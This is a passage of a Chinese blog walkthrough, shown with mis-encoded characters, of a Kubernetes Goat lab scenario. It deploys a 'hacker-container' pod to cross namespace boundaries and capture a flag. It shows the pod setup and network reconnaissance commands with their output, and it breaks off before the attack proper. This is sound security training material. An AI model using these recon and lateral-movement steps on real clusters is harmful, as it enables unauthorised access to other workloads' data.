<p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒKubernetes é‡‡ç”¨çš„æ˜¯æ‰å¹³åŒ–ç½‘ç»œæ¶æ„â€”â€”å¦‚æœæˆ‘ä»¬æƒ³è¦å®ç°çœŸæ­£çš„éš”ç¦»ï¼Œå°±å¾—æ‰‹åŠ¨è®¾ç½®è¾¹ç•Œï¼Œæ¯”å¦‚é…ç½®ç½‘ç»œç­–ç•¥ï¼ˆNetwork Security Policies, NSPï¼‰ä¹‹ç±»çš„è§„åˆ™ã€‚</p>
<p>è¿™ç§æ”»å‡»æ‰‹æ³•å¸¸è§äºæœªä¸¥æ ¼é…ç½®ç½‘ç»œç­–ç•¥çš„é›†ç¾¤ï¼Œæ”»å‡»è€…å¯èƒ½é€šè¿‡ Service Account æƒé™æå‡æˆ–ç›´æ¥è®¿é—®é›†ç¾¤å†…ç½‘ IPï¼Œè·¨å‘½åç©ºé—´çªƒå–æ•°æ®ã€‚</p>
<p>Kubernetes é»˜è®¤é‡‡ç”¨<strong>æ‰å¹³åŒ–ç½‘ç»œæ¶æ„</strong>ï¼Œè¿™æ„å‘³ç€é›†ç¾¤å†…çš„ä»»ä½• Pod/Service éƒ½èƒ½äº’ç›¸é€šä¿¡ã€‚å‘½åç©ºé—´ï¼ˆnamespaceï¼‰æœ¬èº«<strong>é»˜è®¤æ²¡æœ‰ä»»ä½•ç½‘ç»œéš”ç¦»é™åˆ¶</strong>â€”â€”åªè¦åœ¨é›†ç¾¤å†…ï¼Œä¸€ä¸ªå‘½åç©ºé—´çš„èµ„æºå°±èƒ½ç›´æ¥è®¿é—®å…¶ä»–å‘½åç©ºé—´çš„èµ„æºã€‚è¿™ç§è®¾è®¡å¯èƒ½å¯¼è‡´æ¨ªå‘æ¸—é€é£é™©ï¼Œä¾‹å¦‚æ”»å‡»è€…é€šè¿‡æœªè¢«é™åˆ¶çš„ Pod è®¿é—®æ•æ„ŸæœåŠ¡ã€‚å®é™…é˜²æŠ¤éœ€ä¾èµ– NetworkPolicy æˆ–æœåŠ¡ç½‘æ ¼ï¼ˆå¦‚ Istioï¼‰å®æ–½å¾®éš”ç¦»ã€‚</p>
<p>æœ¬åœºæ™¯ä¸»è¦å›´ç»•å¦‚ä½•ç»•è¿‡å‘½åç©ºé—´é™åˆ¶ä»¥è®¿é—®å…¶ä»–å‘½åç©ºé—´çš„èµ„æºã€‚</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2014.36.30.png" style="zoom:50%;">

<p>å®è·µç›®çš„ï¼š</p>
<ul>
<li>ç†è§£Kuberneteså‘½åç©ºé—´éš”ç¦»èƒ½ä¿éšœå®‰å…¨çš„è¯¯è§£ã€‚</li>
<li>äº†è§£Kubernetesç½‘ç»œå¹³é¢æ¨¡å¼å’Œè·¨å‘½åç©ºé—´é€šä¿¡ã€‚</li>
<li>å¯¹ç½‘ç»œç«¯å£æ‰«æå’Œæ¼æ´è¿›è¡Œä¾¦å¯Ÿå’Œæµ‹è¯•ã€‚</li>
<li>ç»•è¿‡å‘½åç©ºé—´é™åˆ¶è·å¾—å¯¹å…¶ä»–å‘½åç©ºé—´èµ„æºçš„è®¿é—®ã€‚</li>
</ul>
<h3 id="3-8-2-åœºæ™¯è®¿é—®"><a href="#3-8-2-åœºæ™¯è®¿é—®" class="headerlink" title="3.8.2 åœºæ™¯è®¿é—®"></a>3.8.2 åœºæ™¯è®¿é—®</h3><ul>
<li>å‰æï¼šåœ¨ default å‘½åç©ºé—´é‡Œè¿è¡Œæ¶æ„å®¹å™¨ï¼ˆhacker-containerï¼‰ã€‚</li>
</ul>
<h4 id="1ï¼‰ç¯å¢ƒæ­å»º"><a href="#1ï¼‰ç¯å¢ƒæ­å»º" class="headerlink" title="1ï¼‰ç¯å¢ƒæ­å»º"></a>1ï¼‰ç¯å¢ƒæ­å»º</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl run <span class="token parameter variable">-it</span> hacker-container <span class="token parameter variable">--image</span><span class="token operator">=</span>madhuakula/hacker-container -- <span class="token function">sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p><strong>åœ¨ Kubernetes é›†ç¾¤ä¸­å¯åŠ¨ä¸€ä¸ªåä¸º <code>hacker-container</code> çš„ä¸´æ—¶ Podï¼Œå¹¶ä»¥äº¤äº’æ¨¡å¼è¿›å…¥è¯¥å®¹å™¨çš„ Shell ç¯å¢ƒ</strong>ã€‚</p>
</blockquote>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2014.52.13.png" style="zoom:67%;">

<p>è¿˜æ˜¯é•œåƒæ— æ³•æ‹‰å–å¯¼è‡´å®¹å™¨æ— æ³•è¿è¡Œã€‚</p>
<blockquote>
<p>æœ¬åœ°æ‹‰å–é•œåƒå¹¶æ‰“åŒ…ï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull madhuakula/hacker-container
<span class="token function">docker</span> save madhuakula/hacker-container <span class="token parameter variable">-o</span> hacker-container.tar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.01.22.png" style="zoom:50%;">

<p>ä¸Šä¼ åˆ°é¶åœºç¯å¢ƒï¼š</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.02.38.png" style="zoom:50%;">

<p>åŠ è½½ï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> load <span class="token parameter variable">-i</span> hacker-container.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.04.07.png" style="zoom:50%;">

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.04.47.png" style="zoom:50%;">
</blockquote>
<p>åˆ é™¤hacker-containerå¹¶é‡æ–°åˆ›å»ºï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> kubectl delete pod hacker-container
<span class="token function">sudo</span> kubectl run <span class="token parameter variable">-it</span> hacker-container <span class="token parameter variable">--image</span><span class="token operator">=</span>madhuakula/hacker-container --image-pull-policy<span class="token operator">=</span>Never -- <span class="token function">sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>éœ€è¦æŒ‡å®š<code>--image-pull-policy=Never</code>å‚æ•°å¼ºåˆ¶kubectlä½¿ç”¨æœ¬åœ°é•œåƒã€‚</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.11.48.png" style="zoom:50%;">

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.12.55.png" style="zoom:50%;">

<p>æˆåŠŸè¿è¡Œ<code>hacker-container</code>ã€‚</p>
<h4 id="2ï¼‰ç›®æ ‡"><a href="#2ï¼‰ç›®æ ‡" class="headerlink" title="2ï¼‰ç›®æ ‡"></a>2ï¼‰ç›®æ ‡</h4><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.15.07.png" style="zoom:50%;">

<ul>
<li>æ”»å…¥secure-middlewareå‘½åç©ºé—´ä¸‹çš„ï¼ˆcache-store podï¼‰ï¼Œæ‹¿åˆ° <strong>k8s_goat_flag</strong> ã€‚</li>
</ul>
<h3 id="3-8-3-å®è·µ"><a href="#3-8-3-å®è·µ" class="headerlink" title="3.8.3 å®è·µ"></a>3.8.3 å®è·µ</h3><ul>
<li>é›†ç¾¤ç½‘ç»œç¯å¢ƒæ¢æµ‹</li>
</ul>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬å¾—æ‘¸æ¸…é›†ç¾¤çš„IPç½‘æ®µã€‚åªæœ‰æŒæ¡äº†è¿™ä¸ªï¼Œæ‰èƒ½ç”¨ç«¯å£æ‰«æå™¨æ‰«éæ•´ä¸ªé›†ç¾¤ï¼Œè¿›è€ŒçŸ¥é“æœåŠ¡å’Œipçš„å¯¹åº”å…³ç³»ã€‚</p>
<p><strong>å‡ ä¸ªå®ç”¨çš„ç½‘ç»œä¾¦æŸ¥å‘½ä»¤</strong>ï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ip</span> route
<span class="token function">ifconfig</span>
<span class="token function">printenv</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">~ <span class="token comment"># ip route</span>
default via <span class="token number">10.244</span>.0.1 dev eth0 
<span class="token number">10.244</span>.0.0/24 dev eth0 scope <span class="token function">link</span>  src <span class="token number">10.244</span>.0.17 
<span class="token number">10.244</span>.0.0/16 via <span class="token number">10.244</span>.0.1 dev eth0 

~ <span class="token comment"># ifconfig</span>
eth0      Link encap:Ethernet  HWaddr 1A:67:40:EB:4D:BA  
          inet addr:10.244.0.17  Bcast:10.244.0.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1450  Metric:1
          RX packets:24 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:3072 <span class="token punctuation">(</span><span class="token number">3.0</span> KiB<span class="token punctuation">)</span>  TX bytes:42 <span class="token punctuation">(</span><span class="token number">42.0</span> B<span class="token punctuation">)</span>
          
~ <span class="token comment"># printenv</span>
<span class="token assign-left variable">INTERNAL_PROXY_API_SERVICE_PORT_3000_TCP_PROTO</span><span class="token operator">=</span>tcp
<span class="token assign-left variable">KUBERNETES_GOAT_HOME_SERVICE_SERVICE_HOST</span><span class="token operator">=</span><span class="token number">10.102</span>.202.149
<span class="token assign-left variable">POOR_REGISTRY_SERVICE_PORT_5000_TCP_ADDR</span><span class="token operator">=</span><span class="token number">10.102</span>.119.162
<span class="token assign-left variable">KUBERNETES_PORT</span><span class="token operator">=</span>tcp://10.96.0.1:443
<span class="token assign-left variable">METADATA_DB_PORT</span><span class="token operator">=</span>tcp://10.99.22.157:80
<span class="token assign-left variable">METADATA_DB_SERVICE_PORT</span><span class="token operator">=</span><span class="token number">80</span>
<span class="token assign-left variable">KUBERNETES_SERVICE_PORT</span><span class="token operator">=</span><span class="token number">443</span>
<span class="token assign-left variable">ETCDCTL_VERSION</span><span class="token operator">=</span><span class="token number">3.4</span>.9
<span class="token assign-left variable">POOR_REGISTRY_SERVICE_PORT_5000_TCP_PORT</span><span class="token operator">=</span><span class="token number">5000</span>
<span class="token assign-left variable"><span class="token environment constant">HOSTNAME</span></span><span class="token operator">=</span>hacker-container
<span class="token assign-left variable">HEALTH_CHECK_SERVICE_PORT_80_TCP_ADDR</span><span class="token operator">=</span><span class="token number">10.105</span>.18.49
<span class="token assign-left variable">POOR_REGISTRY_SERVICE_PORT_5000_TCP_PROTO</span><span class="token operator">=</span>tcp
<span class="token assign-left variable">HELMV2_VERSION</span><span class="token operator">=</span><span class="token number">2.16</span>.7
<span class="token assign-left variable"><span class="token environment constant">SHLVL</span></span><span class="token operator">=</span><span class="token number">1</span>
<span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span>/root
<span class="token assign-left variable">METADATA_DB_PORT_80_TCP_ADDR</span><span class="token operator">=</span><span class="token number">10.99</span>.22.157
<span class="token assign-left variable">KUBERNETES_GOAT_HOME_SERVICE_PORT</span><span class="token operator">=</span>tcp://10.102.202.149:80
<span class="token assign-left variable">KUBERNETES_GOAT_HOME_SERVICE_SERVICE_PORT</span><span class="token operator">=</span><span class="token number">80</span>
<span class="token assign-left variable">HEALTH_CHECK_SERVICE_PORT_80_TCP_PORT</span><span class="token operator">=</span><span class="token number">80</span>
<span class="token assign-left variable">HEALTH_CHECK_SERVICE_PORT_80_TCP_PROTO</span><span class="token operator">=</span>tcp
<span class="token assign-left variable">INTERNAL_PROXY_API_SERVICE_PORT_3000_TCP</span><span class="token operator">=</span>tcp://10.100.116.234:3000
<span class="token assign-left variable">INTERNAL_PROXY_API_SERVICE_SERVICE_HOST</span><span class="token operator">=</span><span class="token number">10.100</span>.116.234
<span class="token assign-left variable">METADATA_DB_PORT_80_TCP_PORT</span><span class="token operator">=</span><span class="token number">80</span>
<span class="token assign-left variable">INTERNAL_PROXY_INFO_APP_SERVICE_PORT_5000_TCP_ADDR</span><span class="token operator">=</span><span class="token number">10.107</span>.180.113
<span class="token assign-left variable">METADATA_DB_PORT_80_TCP_PROTO</span><span class="token operator">=</span>tcp
<span class="token assign-left variable">POOR_REGISTRY_SERVICE_SERVICE_HOST</span><span class="token operator">=</span><span class="token number">10.102</span>.119.162
<span class="token assign-left variable">AUDIT2RBAC_VERSION</span><span class="token operator">=</span><span class="token number">0.8</span>.0
<span class="token assign-left variable">POOR_REGISTRY_SERVICE_PORT_5000_TCP</span><span class="token operator">=</span>tcp://10.102.119.162:5000
<span class="token assign-left variable">POPEYE_VERSION</span><span class="token operator">=</span><span class="token number">0.9</span>.0
<span class="token assign-left variable">INTERNAL_PROXY_INFO_APP_SERVICE_PORT_5000_TCP_PORT</span><span class="token operator">=</span><span class="token number">5000</span>
<span class="token assign-left variable">KUBERNETES_GOAT_HOME_SERVICE_PORT_80_TCP_ADDR</span><span class="token operator">=</span><span class="token number">10.102</span>.202.149
<span class="token assign-left variable">HADOLINT_VERSION</span><span class="token operator">=</span><span class="token number">2.10</span>.0
<span class="token assign-left variable">INTERNAL_PROXY_INFO_APP_SERVICE_PORT_5000_TCP_PROTO</span><span class="token operator">=</span>tcp
<span class="token assign-left variable">INTERNAL_PROXY_API_SERVICE_SERVICE_PORT</span><span class="token operator">=</span><span class="token number">3000</span>
<span class="token assign-left variable">KUBERNETES_GOAT_HOME_SERVICE_PORT_80_TCP_PORT</span><span class="token operator">=</span><span class="token number">80</span>
<span class="token assign-left variable">INTERNAL_PROXY_API_SERVICE_PORT</span><span class="token operator">=</span>tcp://10.100.116.234:3000
<span class="token assign-left variable">HEALTH_CHECK_SERVICE_PORT_80_TCP</span><span class="token operator">=</span>tcp://10.105.18.49:80
